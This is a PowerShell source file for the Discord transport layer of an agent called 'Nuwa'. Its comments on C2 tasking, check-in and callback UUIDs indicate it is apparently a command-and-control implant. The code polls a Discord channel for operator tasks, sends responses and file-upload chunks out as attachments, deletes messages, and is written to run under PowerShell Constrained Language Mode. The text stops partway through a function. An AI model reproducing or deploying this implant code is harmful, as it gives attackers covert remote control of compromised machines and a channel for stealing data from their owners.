function Get-NuwaDiscordUserAgent {
    [CmdletBinding()]
    param()

    return [string]$script:NuwaConfig.DiscordUserAgent
}

function Get-NuwaDiscordApiHeaders {
    [CmdletBinding()]
    param()

    return @{
        Authorization = ('Bot {0}' -f $script:NuwaConfig.DiscordToken)
        'User-Agent' = Get-NuwaDiscordUserAgent
    }
}

function Get-NuwaDiscordApiUri {
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][string]$Path)

    $apiVersion = [int]$script:NuwaConfig.DiscordApiVersion
    if ($apiVersion -ne 10) {
        throw 'Unsupported Discord API version'
    }
    return ([string]$script:NuwaConfig.DiscordApiOrigin).TrimEnd('/') +
        ('/api/v{0}/' -f $apiVersion) + $Path.TrimStart('/')
}

function Assert-NuwaDiscordAttachmentUri {
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][string]$Url)

    $actual = [Uri]$Url
    $expected = [Uri]([string]$script:NuwaConfig.DiscordCdnOrigin)
    if (-not $actual.IsAbsoluteUri -or
        $actual.Scheme -ne $expected.Scheme -or
        $actual.Host -ne $expected.Host -or
        $actual.Port -ne $expected.Port) {
        throw 'Discord attachment URL is outside the configured CDN origin'
    }
    return $actual.AbsoluteUri
}

function Get-NuwaDiscordMessagesUri {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [int]$Limit = 100,

        [Parameter(Mandatory = $false)]
        [string]$AfterMessageId = ''
    )

    if (-not [string]::IsNullOrWhiteSpace($AfterMessageId)) {
        $numericAfterMessageId = ConvertTo-NuwaDiscordUnsignedDecimal -Value $AfterMessageId
        if ($null -eq $numericAfterMessageId) {
            throw 'Discord after_message_id must contain a valid unsigned decimal identifier'
        }
    }
    $uri = Get-NuwaDiscordApiUri -Path (
        'channels/{0}/messages?limit={1}' -f $script:NuwaConfig.BotChannel, $Limit)
    if (-not [string]::IsNullOrWhiteSpace($AfterMessageId)) {
        $uri = ('{0}&after={1}' -f $uri, $AfterMessageId)
    }
    return $uri
}

function ConvertTo-NuwaDiscordUnsignedDecimal {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [AllowEmptyString()]
        [string]$Value
    )

    if ([string]::IsNullOrEmpty($Value)) {
        return $null
    }
    for ($index = 0; $index -lt $Value.Length; $index += 1) {
        $digit = [int][char]$Value[$index]
        if ($digit -lt 48 -or $digit -gt 57) {
            return $null
        }
    }
    try {
        return [UInt64]$Value
    } catch {
        return $null
    }
}

function Get-NuwaDiscordChannelUri {
    [CmdletBinding()]
    param()

    return Get-NuwaDiscordApiUri -Path (
        'channels/{0}/messages' -f $script:NuwaConfig.BotChannel)
}

# NUWA_DISCORD_FIXED_ENCODE_BEGIN
# Replaced at build time with the fixed byte-oriented Discord carrier.
# NUWA_DISCORD_FIXED_ENCODE_END

function ConvertFrom-NuwaDiscordJsonObject {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Value
    )

    if ([string]::IsNullOrWhiteSpace($Value)) {
        return $null
    }

    try {
        return ($Value | ConvertFrom-Json)
    } catch {
        return $null
    }
}

function ConvertFrom-NuwaDiscordContent {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$Content
    )

    if ($null -eq $Content) {
        return ''
    }

    if ($Content -is [string]) {
        return [string]$Content
    }

    if ($Content -is [byte[]]) {
        return ConvertFrom-NuwaUtf8Bytes -Bytes $Content
    }

    if ($Content -is [Array]) {
        return ConvertFrom-NuwaUtf8Bytes -Bytes ([byte[]]$Content)
    }

    return [string]$Content
}

function Get-NuwaDiscordRateLimitDelayMilliseconds {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [AllowNull()]
        $ErrorRecord = $null,

        [Parameter(Mandatory = $false)]
        [string]$ResponseContent = '',

        [Parameter(Mandatory = $false)]
        [int]$StatusCode = 0
    )

    $payloadJson = $ResponseContent
    if ([string]::IsNullOrWhiteSpace($payloadJson) -and $null -ne $ErrorRecord) {
        # Direct ErrorDetails access is permitted in Windows PowerShell CLM;
        # avoid PSObject reflection and non-core WebResponse inspection.
        try {
            $errorDetails = $ErrorRecord.ErrorDetails
            if ($null -ne $errorDetails) {
                $payloadJson = [string]$errorDetails.Message
            }
        } catch {
            $payloadJson = ''
        }
    }

    if (-not [string]::IsNullOrWhiteSpace($payloadJson)) {
        $payload = ConvertFrom-NuwaDiscordJsonObject -Value $payloadJson
        $retryAfter = Get-NuwaDiscordObjectProperty -Object $payload -Name 'retry_after'
        if ($null -ne $retryAfter) {
            try {
                $retryAfterSeconds = [double]$retryAfter
                if ($retryAfterSeconds -ge 0) {
                    return [int][Math]::Ceiling(($retryAfterSeconds * 1000.0) + 100.0)
                }
            } catch {
            }
        }
    }

    # Keep the CLM-safe bounded fallback for malformed rate-limit responses
    # and transient failures whose response details are unavailable.
    return 1100
}

function Invoke-NuwaDiscordWebRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [hashtable]$InvokeParameters,

        [Parameter(Mandatory = $false)]
        [int]$MaxAttempts = 5
    )

    if (-not $InvokeParameters.ContainsKey('TimeoutSec')) {
        $InvokeParameters.TimeoutSec = 30
    }
    if (-not $InvokeParameters.ContainsKey('DisableKeepAlive')) {
        $InvokeParameters.DisableKeepAlive = $true
    }

    for ($attempt = 0; $attempt -lt $MaxAttempts; $attempt += 1) {
        try {
            return Invoke-WebRequest @InvokeParameters
        } catch {
            $delayMilliseconds = Get-NuwaDiscordRateLimitDelayMilliseconds -ErrorRecord $_
            if ($delayMilliseconds -lt 0 -or ($attempt + 1) -ge $MaxAttempts) {
                throw
            }
            Start-Sleep -Milliseconds $delayMilliseconds
        }
    }

    throw 'Discord API request exceeded retry attempts'
}

function Get-NuwaDiscordAttachmentContent {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Url,

        [Parameter(Mandatory = $true)]
        [long]$DeclaredSize
    )

    if ($DeclaredSize -lt 0 -or $DeclaredSize -gt 2097152) {
        throw 'Discord envelope attachment exceeds the UTF-8 byte limit'
    }

    $downloadPath = Join-Path -Path $env:TEMP -ChildPath ([string]([guid]::NewGuid()))
    try {
        $invokeParameters = @{
            Uri = Assert-NuwaDiscordAttachmentUri -Url $Url
            Method = 'GET'
            OutFile = $downloadPath
            UseBasicParsing = $true
            MaximumRedirection = 0
        }
        Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
        Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters | Out-Null
        if (-not (Test-Path -LiteralPath $downloadPath -PathType Leaf)) {
            throw 'Discord envelope attachment download produced no file'
        }
        $bytes = [byte[]](Get-Content -LiteralPath $downloadPath -Encoding Byte -ReadCount 0)
        if ($bytes.Length -gt 2097152) {
            throw 'Discord envelope attachment exceeds the UTF-8 byte limit'
        }
        return ConvertFrom-NuwaUtf8Bytes -Bytes $bytes
    } finally {
        Remove-Item -LiteralPath $downloadPath -Force -ErrorAction SilentlyContinue
    }
}

# NUWA_DISCORD_FIXED_DECODE_BEGIN
# Replaced at build time with the fixed byte-oriented Discord carrier.
# NUWA_DISCORD_FIXED_DECODE_END

function Get-NuwaDiscordObjectProperty {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$Object,

        [Parameter(Mandatory = $true)]
        [string]$Name
    )

    if ($null -eq $Object) {
        return $null
    }

    if (Test-NuwaDiscordCandidateRecord -Value $Object) {
        $Object = $Object[0]
    }

    if ($Object -is [hashtable]) {
        if ($Object.ContainsKey($Name)) {
            return $Object[$Name]
        }
        return $null
    }

    try {
        return $Object.$Name
    } catch {
        return $null
    }
}

function Test-NuwaDiscordCandidateRecord {
    [CmdletBinding()]
    param([Parameter(Mandatory = $false)][AllowNull()][object]$Value)

    return ($null -ne $Value -and $Value -is [object[]] -and $Value.Count -eq 4)
}

function Get-NuwaDiscordCandidateSlot {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)][object]$Candidate,
        [Parameter(Mandatory = $true)][ValidateRange(0, 3)][int]$Slot
    )

    if (-not (Test-NuwaDiscordCandidateRecord -Value $Candidate)) {
        return $null
    }
    return ,$Candidate[$Slot]
}

function Get-NuwaDiscordCandidateMessage {
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][object]$Candidate)

    if (Test-NuwaDiscordCandidateRecord -Value $Candidate) {
        return ,$Candidate[0]
    }
    return ,$Candidate
}

function Get-NuwaDiscordAgentField {
    [CmdletBinding()]
    param([Parameter(Mandatory = $false)][AllowNull()][object]$Object,
          [Parameter(Mandatory = $true)][int]$Field)
    if ($null -eq $Object -or $Object -isnot [System.Collections.IDictionary]) { return $null }
    if (-not $Object.Contains($Field)) { return $null }
    return $Object[$Field]
}

function ConvertFrom-NuwaDiscordWireBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$WireBody,

        [Parameter(Mandatory = $true)]
        [string]$Uuid,

        [Parameter(Mandatory = $true)]
        [int]$Action
    )

    $wireBytes = if ($WireBody -is [byte[]]) { [byte[]]$WireBody } else { [byte[]](ConvertTo-NuwaUtf8Bytes -Value ([string]$WireBody)) }
    if ($wireBytes.Length -eq 0) {
        return $null
    }

    $context = @{}
    $uuidLength = if ($script:NuwaConfig.MessageUuidLength) {
        [int]$script:NuwaConfig.MessageUuidLength
    } else {
        36
    }

    try {
        $decodedJson = ConvertFrom-NuwaWireBytes `
            -WireBytes $wireBytes `
            -Context $context
        if ([string]::IsNullOrWhiteSpace($decodedJson)) {
            return $null
        }

        return ConvertFrom-NuwaAgentJsonValue -Value ($decodedJson | ConvertFrom-Json -ErrorAction Stop)
    } catch {
        return $null
    }
}

function Test-NuwaDiscordResponseMatchesRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$ExpectedRequest = $null,

        [Parameter(Mandatory = $false)]
        [int]$ExpectedAction = 0
    )

    if ($null -eq $ExpectedRequest -or $ExpectedAction -ne $script:NuwaA_post_response) {
        return $true
    }

    $messageResponse = Get-NuwaDiscordCandidateSlot -Candidate $Message -Slot 1
    if ($null -eq $messageResponse) {
        return $true
    }

    $requestResponses = @(Get-NuwaDiscordAgentField -Object $ExpectedRequest -Field $script:NuwaF_responses)
    $messageResponses = @(Get-NuwaDiscordAgentField -Object $messageResponse -Field $script:NuwaF_responses)
    if ($requestResponses.Count -eq 0 -or $messageResponses.Count -eq 0) {
        return $true
    }

    $requestEntry = $requestResponses[0]
    $messageEntry = $messageResponses[0]
    if ($null -eq $requestEntry -or $null -eq $messageEntry) {
        return $true
    }

    $requestTaskId = [string](Get-NuwaDiscordAgentField -Object $requestEntry -Field $script:NuwaF_task_id)
    $messageTaskId = [string](Get-NuwaDiscordAgentField -Object $messageEntry -Field $script:NuwaF_task_id)
    if (
        -not [string]::IsNullOrWhiteSpace($requestTaskId) -and
        -not [string]::IsNullOrWhiteSpace($messageTaskId) -and
        $requestTaskId -ne $messageTaskId
    ) {
        return $false
    }

    $requestUpload = Get-NuwaDiscordAgentField -Object $requestEntry -Field $script:NuwaF_upload
    if ($null -ne $requestUpload) {
        $requestChunkNum = Get-NuwaDiscordAgentField -Object $requestUpload -Field $script:NuwaF_chunk_num
        $messageChunkNum = Get-NuwaDiscordAgentField -Object $messageEntry -Field $script:NuwaF_chunk_num
        if ($null -ne $requestChunkNum -and $null -ne $messageChunkNum -and [int]$requestChunkNum -ne [int]$messageChunkNum) {
            return $false
        }

        $requestFileId = [string](Get-NuwaDiscordAgentField -Object $requestUpload -Field $script:NuwaF_file_id)
        $messageFileId = [string](Get-NuwaDiscordAgentField -Object $messageEntry -Field $script:NuwaF_file_id)
        if (
            -not [string]::IsNullOrWhiteSpace($requestFileId) -and
            -not [string]::IsNullOrWhiteSpace($messageFileId) -and
            $requestFileId -ne $messageFileId
        ) {
            return $false
        }
    }

    $requestDownload = Get-NuwaDiscordAgentField -Object $requestEntry -Field $script:NuwaF_download
    if ($null -ne $requestDownload) {
        $requestChunkNum = Get-NuwaDiscordAgentField -Object $requestDownload -Field $script:NuwaF_chunk_num
        $messageChunkNum = Get-NuwaDiscordAgentField -Object $messageEntry -Field $script:NuwaF_chunk_num
        if ($null -ne $requestChunkNum -and $null -ne $messageChunkNum -and [int]$requestChunkNum -ne [int]$messageChunkNum) {
            return $false
        }

        $requestFileId = [string](Get-NuwaDiscordAgentField -Object $requestDownload -Field $script:NuwaF_file_id)
        $messageFileId = [string](Get-NuwaDiscordAgentField -Object $messageEntry -Field $script:NuwaF_file_id)
        if (
            -not [string]::IsNullOrWhiteSpace($requestFileId) -and
            -not [string]::IsNullOrWhiteSpace($messageFileId) -and
            $requestFileId -ne $messageFileId
        ) {
            return $false
        }
    }

    return $true
}

function Find-NuwaDiscordInboundMessage {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [AllowNull()]
        [AllowEmptyCollection()]
        [object[]]$Messages,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedClientId,

        [Parameter(Mandatory = $false)]
        [string[]]$AlternateClientIds = @(),

        [Parameter(Mandatory = $false)]
        [int]$ExpectedAction = 0,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedUuid = '',

        [Parameter(Mandatory = $false)]
        [DateTimeOffset]$MinimumTimestamp = [DateTimeOffset]::MinValue,

        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$ExpectedRequest = $null,

        [Parameter(Mandatory = $false)]
        [switch]$RequireExpectedClientId
    )

    if ($null -eq $Messages) {
        return $null
    }

    $candidates = @()
    $requestMatchedCandidates = @()
    foreach ($message in $Messages) {
        $messageId = Get-NuwaDiscordMessageId -Message $message
        if (
            -not [string]::IsNullOrWhiteSpace($messageId) -and
            $script:NuwaDiscordProcessedMessageIds -and
            ($script:NuwaDiscordProcessedMessageIds -contains $messageId)
        ) {
            continue
        }
        if (-not (Test-NuwaDiscordMessageTimestamp -Message $message -MinimumTimestamp $MinimumTimestamp)) {
            continue
        }
        $parsed = ConvertFrom-NuwaDiscordMessage -Message $message
        if ($null -eq $parsed) {
            continue
        }
        $decodedBody = $null
        $wireBody = $null
        if ($parsed.to_server) {
            continue
        }
        $targetClientId = [string](Get-NuwaDiscordObjectProperty -Object $parsed -Name 'client_id')
        if ([string]::IsNullOrWhiteSpace($targetClientId)) {
            $targetClientId = [string](Get-NuwaDiscordObjectProperty -Object $parsed -Name 'sender_id')
        }
        if ($RequireExpectedClientId -and $targetClientId -ne $ExpectedClientId) {
            continue
        }
        $acceptedClientIds = @($ExpectedClientId)
        foreach ($alternateClientId in $AlternateClientIds) {
            if (-not [string]::IsNullOrWhiteSpace([string]$alternateClientId)) {
                $acceptedClientIds += [string]$alternateClientId
            }
        }
        if ($acceptedClientIds -notcontains $targetClientId) {
            continue
        }
        if ($ExpectedAction -gt 0) {
            $decodeCandidates = @()
            if (-not [string]::IsNullOrWhiteSpace($ExpectedUuid)) {
                $decodeCandidates += $ExpectedUuid
            }
            foreach ($acceptedClientId in $acceptedClientIds) {
                if (-not [string]::IsNullOrWhiteSpace([string]$acceptedClientId)) {
                    $decodeCandidates += [string]$acceptedClientId
                }
            }
            if (-not [string]::IsNullOrWhiteSpace($targetClientId)) {
                $decodeCandidates += $targetClientId
            }
            $parsedSenderId = [string](Get-NuwaDiscordObjectProperty -Object $parsed -Name 'sender_id')
            if (-not [string]::IsNullOrWhiteSpace($parsedSenderId)) {
                $decodeCandidates += $parsedSenderId
            }

            $parsedMessageBody = $parsed.message
            $parsedMessageBytes = if ($parsedMessageBody -is [byte[]]) { [byte[]]$parsedMessageBody } else { [byte[]](ConvertTo-NuwaUtf8Bytes -Value ([string]$parsedMessageBody)) }
            $resolvedBody = $null
            if ($ExpectedAction -eq $script:NuwaA_post_response -and $parsedMessageBytes.Length -eq 0) {
                $acknowledgementUuid = if (-not [string]::IsNullOrWhiteSpace($ExpectedUuid)) {
                    $ExpectedUuid
                } else {
                    $targetClientId
                }
                $acknowledgementMessage = @{}
                $acknowledgementMessage[$script:NuwaF_action] = $script:NuwaA_post_response
                $acknowledgementMessage[$script:NuwaF_responses] = @()
                $acknowledgementContext = @{}
                $resolvedBody = @{
                    Decoded = $acknowledgementMessage
                    WireBody = [byte[]](ConvertTo-NuwaWireBytes `
                            -Message $acknowledgementMessage `
                            -Context $acknowledgementContext)
                }
            } else {
                $resolvedBody = Resolve-NuwaDiscordDecodedBody `
                    -Message $parsed `
                    -ExpectedAction $ExpectedAction `
                    -CandidateUuids $decodeCandidates
            }
            if ($null -eq $resolvedBody) {
                continue
            }
            if (
                $null -ne (Get-NuwaDiscordAgentField -Object $resolvedBody.Decoded -Field $script:NuwaF_action) -and
                [int](Get-NuwaDiscordAgentField -Object $resolvedBody.Decoded -Field $script:NuwaF_action) -ne $ExpectedAction
            ) {
                continue
            }
            $decodedBody = $resolvedBody.Decoded
            $wireBody = [byte[]]$resolvedBody.WireBody
        }
        $candidateRecord = @($parsed, $decodedBody, $null, $messageId)
        $candidateRecord[2] = $wireBody
        $candidates += ,$candidateRecord
        if (Test-NuwaDiscordResponseMatchesRequest -Message $candidateRecord -ExpectedRequest $ExpectedRequest -ExpectedAction $ExpectedAction) {
            $requestMatchedCandidates += ,$candidateRecord
        }
    }

    if ($ExpectedAction -eq $script:NuwaA_get_tasking) {
        foreach ($candidate in $requestMatchedCandidates) {
            if (Test-NuwaDiscordMessageHasTasks -Message $candidate -ExpectedAction $ExpectedAction -ExpectedUuid $ExpectedUuid) {
                return ,$candidate
            }
        }
        foreach ($candidate in $candidates) {
            if (Test-NuwaDiscordMessageHasTasks -Message $candidate -ExpectedAction $ExpectedAction -ExpectedUuid $ExpectedUuid) {
                return ,$candidate
            }
        }
    }

    if ($requestMatchedCandidates.Count -gt 0) {
        return ,$requestMatchedCandidates[0]
    }

    if ($candidates.Count -gt 0) {
        return ,$candidates[0]
    }

    return $null
}

function Get-NuwaDiscordMessageId {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message
    )

    return [string](Get-NuwaDiscordObjectProperty -Object $Message -Name 'id')
}

function Test-NuwaDiscordMessageTimestamp {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $false)]
        [DateTimeOffset]$MinimumTimestamp = [DateTimeOffset]::MinValue
    )

    if ($MinimumTimestamp -eq [DateTimeOffset]::MinValue) {
        return $true
    }

    $timestampValue = Get-NuwaDiscordObjectProperty -Object $Message -Name 'timestamp'
    if ([string]::IsNullOrWhiteSpace([string]$timestampValue)) {
        return $false
    }

    try {
        return ([DateTimeOffset](Get-Date -Date ([string]$timestampValue)) -gt $MinimumTimestamp)
    } catch {
        return $false
    }
}

function Test-NuwaDiscordInboundMessageAction {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $true)]
        [int]$ExpectedAction,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedUuid = ''
    )

    if ($ExpectedAction -le 0) {
        return $true
    }

    $decoded = ConvertFrom-NuwaDiscordDecodedBody -Message $Message -ExpectedAction $ExpectedAction -ExpectedUuid $ExpectedUuid
    if ($null -eq $decoded) {
        return $false
    }
    $action = Get-NuwaDiscordAgentField -Object $decoded -Field $script:NuwaF_action
    if ($null -eq $action) {
        return $true
    }

    return ([int]$action -eq $ExpectedAction)
}

function ConvertFrom-NuwaDiscordDecodedBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $true)]
        [int]$ExpectedAction,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedUuid = ''
    )

    $messageObject = Get-NuwaDiscordCandidateMessage -Candidate $Message
    $messageBody = $messageObject.message
    $messageBytes = if ($messageBody -is [byte[]]) { [byte[]]$messageBody } else { [byte[]](ConvertTo-NuwaUtf8Bytes -Value ([string]$messageBody)) }
    if ($messageBytes.Length -eq 0) {
        return $null
    }

    $cachedDecoded = Get-NuwaDiscordCandidateSlot -Candidate $Message -Slot 1
    if ($null -ne $cachedDecoded) {
        if (
            $null -eq (Get-NuwaDiscordAgentField -Object $cachedDecoded -Field $script:NuwaF_action) -or
            [int](Get-NuwaDiscordAgentField -Object $cachedDecoded -Field $script:NuwaF_action) -eq $ExpectedAction
        ) {
            return $cachedDecoded
        }
    }

    $uuid = if (-not [string]::IsNullOrWhiteSpace($ExpectedUuid)) {
        $ExpectedUuid
    } else {
        $messageClientId = [string](Get-NuwaDiscordObjectProperty -Object $Message -Name 'client_id')
        if (-not [string]::IsNullOrWhiteSpace($messageClientId)) {
            $messageClientId
        } else {
            [string](Get-NuwaDiscordObjectProperty -Object $Message -Name 'sender_id')
        }
    }

    $context = @{}
    $uuidLength = if ($script:NuwaConfig.MessageUuidLength) {
        [int]$script:NuwaConfig.MessageUuidLength
    } else {
        36
    }

    try {
        $decodedJson = ConvertFrom-NuwaResponseBody `
            -ResponseBody $messageBytes `
            -ExpectedUuid $uuid `
            -UuidLength $uuidLength `
            -Context $context
        if ([string]::IsNullOrWhiteSpace($decodedJson)) {
            return $null
        }

        return (ConvertFrom-NuwaAgentJsonValue -Value ($decodedJson | ConvertFrom-Json -ErrorAction Stop))
    } catch {
        return $null
    }
}

function Resolve-NuwaDiscordDecodedBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $true)]
        [int]$ExpectedAction,

        [Parameter(Mandatory = $false)]
        [string[]]$CandidateUuids = @()
    )

    $messageObject = Get-NuwaDiscordCandidateMessage -Candidate $Message
    $messageBody = $messageObject.message
    $messageBytes = if ($messageBody -is [byte[]]) { [byte[]]$messageBody } else { [byte[]](ConvertTo-NuwaUtf8Bytes -Value ([string]$messageBody)) }
    if ($messageBytes.Length -eq 0) {
        return $null
    }

    $uuidLength = if ($script:NuwaConfig.MessageUuidLength) {
        [int]$script:NuwaConfig.MessageUuidLength
    } else {
        36
    }

    $attemptedUuids = @()
    foreach ($candidateUuid in $CandidateUuids) {
        $candidate = [string]$candidateUuid
        if ([string]::IsNullOrWhiteSpace($candidate) -or ($attemptedUuids -contains $candidate)) {
            continue
        }
        $attemptedUuids += $candidate

        $context = @{}

        try {
            $resolved = Resolve-NuwaResponseBody `
                -ResponseBody $messageBytes `
                -ExpectedUuid $candidate `
                -UuidLength $uuidLength `
                -Context $context
            if ($null -eq $resolved -or [string]::IsNullOrWhiteSpace([string]$resolved.Json)) {
                continue
            }

            $decoded = ConvertFrom-NuwaAgentJsonValue -Value (([string]$resolved.Json) | ConvertFrom-Json -ErrorAction Stop)
            if ($null -eq $decoded) {
                continue
            }

            return @{
                Decoded = $decoded
                WireBody = [byte[]]$resolved.WireBody
            }
        } catch {
            Write-NuwaDebug ('Discord response body rejected for {0}: {1}' -f $candidate, $_.Exception.Message)
            continue
        }
    }

    return $null
}

function Test-NuwaDiscordMessageHasTasks {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $true)]
        [int]$ExpectedAction,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedUuid = ''
    )

    $decoded = ConvertFrom-NuwaDiscordDecodedBody -Message $Message -ExpectedAction $ExpectedAction -ExpectedUuid $ExpectedUuid
    if ($null -eq $decoded) {
        return $false
    }
    $tasks = Get-NuwaDiscordAgentField -Object $decoded -Field $script:NuwaF_tasks
    if ($null -eq $tasks) {
        return $false
    }

    return (@($tasks).Count -gt 0)
}

function Get-NuwaDiscordMessages {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [string]$AfterMessageId = ''
    )

    $invokeParameters = @{
        Uri = Get-NuwaDiscordMessagesUri -AfterMessageId $AfterMessageId
        Method = 'GET'
        Headers = Get-NuwaDiscordApiHeaders
        UseBasicParsing = $true
    }
    Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
    $response = Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters
    $rawContent = ConvertFrom-NuwaDiscordContent -Content $response.Content
    if ([string]::IsNullOrWhiteSpace($rawContent)) {
        return @()
    }
    $parsed = $rawContent | ConvertFrom-Json
    if ($null -eq $parsed) {
        return @()
    }
    return $parsed
}

function Remove-NuwaDiscordMessage {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$MessageId
    )

    $invokeParameters = @{
        Uri = ('{0}/{1}' -f (Get-NuwaDiscordChannelUri), $MessageId)
        Method = 'DELETE'
        Headers = Get-NuwaDiscordApiHeaders
        TimeoutSec = 5
        DisableKeepAlive = $true
        UseBasicParsing = $true
    }
    Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
    Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters -MaxAttempts 1 | Out-Null
}

function Send-NuwaDiscordApiJson {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Content
    )

    $requestJson = @{ content = $Content } | ConvertTo-Json -Compress
    $invokeParameters = @{
        Uri = Get-NuwaDiscordChannelUri
        Method = 'POST'
        Headers = Get-NuwaDiscordApiHeaders
        Body = [byte[]](ConvertTo-NuwaUtf8Bytes -Value $requestJson)
        ContentType = 'application/json'
        UseBasicParsing = $true
    }
    Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
    $response = Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters
    $content = ConvertFrom-NuwaDiscordContent -Content $response.Content
    return ConvertFrom-NuwaDiscordJsonObject -Value $content
}

function New-NuwaDiscordMultipartBoundary {
    [CmdletBinding()]
    param()

    return [string]([guid]::NewGuid())
}

function ConvertTo-NuwaDiscordMultipartBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Content,

        [Parameter(Mandatory = $true)]
        [string]$Boundary
    )

    $payloadJson = '{"content":""}'
    $multipart = (
        '--' + $Boundary + "`r`n" +
        'Content-Disposition: form-data; name="payload_json"' + "`r`n" +
        'Content-Type: application/json' + "`r`n`r`n" +
        $payloadJson + "`r`n" +
        '--' + $Boundary + "`r`n" +
        'Content-Disposition: form-data; name="files[0]"; filename="status-server"' + "`r`n" +
        'Content-Type: application/json' + "`r`n`r`n" +
        $Content + "`r`n" +
        '--' + $Boundary + "--`r`n"
    )
    $bytes = [byte[]](ConvertTo-NuwaUtf8Bytes -Value $multipart)
    return ,$bytes
}

function Send-NuwaDiscordApiAttachment {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Content
    )

    $boundary = New-NuwaDiscordMultipartBoundary
    $invokeParameters = @{
        Uri = Get-NuwaDiscordChannelUri
        Method = 'POST'
        Headers = Get-NuwaDiscordApiHeaders
        Body = (ConvertTo-NuwaDiscordMultipartBody -Content $Content -Boundary $boundary)
        ContentType = ('multipart/form-data; boundary={0}' -f $boundary)
        UseBasicParsing = $true
    }
    Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
    $response = Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters
    $responseContent = ConvertFrom-NuwaDiscordContent -Content $response.Content
    return ConvertFrom-NuwaDiscordJsonObject -Value $responseContent
}

function Invoke-NuwaDiscordRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [AllowEmptyString()]
        [byte[]]$TransportBody = @(),

        [Parameter(Mandatory = $true)]
        [byte[]]$WireBody,

        [Parameter(Mandatory = $true)]
        [string]$Uuid,

        [Parameter(Mandatory = $false)]
        [int]$ExpectedAction = 0
    )

    if ($TransportBody.Length -eq 0) {
        $TransportBody = $WireBody
    }
    $wrapper = ConvertTo-NuwaDiscordMessageWrapper -Message $TransportBody -SenderId $Uuid -ToServer $true
    $expectedRequest = ConvertFrom-NuwaDiscordWireBody -WireBody $WireBody -Uuid $Uuid -Action $ExpectedAction
    $requestStartedAt = [DateTimeOffset]::UtcNow
    $previousRequestStartedAt = $script:NuwaDiscordLastRequestStartedAt
    $script:NuwaDiscordLastRequestStartedAt = $requestStartedAt
    $pendingTaskingMinimumTimestamp = $requestStartedAt
    $payloadTaskingHandoffMinimumTimestamp = $null
    if ($ExpectedAction -eq $script:NuwaA_get_tasking) {
        # The C2 service can post a task while Nuwa is still finishing the
        # preceding response.  It then falls before this request's Discord
        # message ID, so the fallback must include the preceding request
        # boundary without reopening the full channel history.
        # Retain the prior tasking boundary rather than the immediately
        # preceding request. A task can be posted while a post_response or
        # update_info exchange is completing; that message then predates the
        # non-tasking request but is still newer than the last tasking poll.
        # A response can be posted after the prior tasking boundary but before
        # the next tasking request begins. Retain that boundary when available,
        # and always cover the bounded response window if state was overwritten
        # by a preceding exchange. Processed message IDs and client-ID matching
        # still prevent replay outside this short window.
        # A pending task can predate the current request, but it cannot predate
        # the preceding tasking boundary for this process. Keep the fallback
        # inside that window so a protected channel does not have to decrypt
        # unrelated historical messages merely to recover pending tasking.
        $previousTaskingRequestStartedAt = $script:NuwaDiscordLastTaskingRequestStartedAt
        if (
            $null -eq $previousTaskingRequestStartedAt -and
            $null -ne $previousRequestStartedAt -and
            -not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.PayloadUUID) -and
            [string]$script:NuwaConfig.PayloadUUID -ne $Uuid
        ) {
            # Push C2 can route the first task through the check-in tracking ID
            # just before the agent adopts its callback UUID. Accept that known
            # payload route only during this first handoff and only for messages
            # newer than the check-in request boundary.
            $payloadTaskingHandoffMinimumTimestamp = $previousRequestStartedAt
        }
        if ($null -ne $previousTaskingRequestStartedAt) {
            $pendingTaskingMinimumTimestamp = $previousTaskingRequestStartedAt
        } elseif ($null -ne $previousRequestStartedAt) {
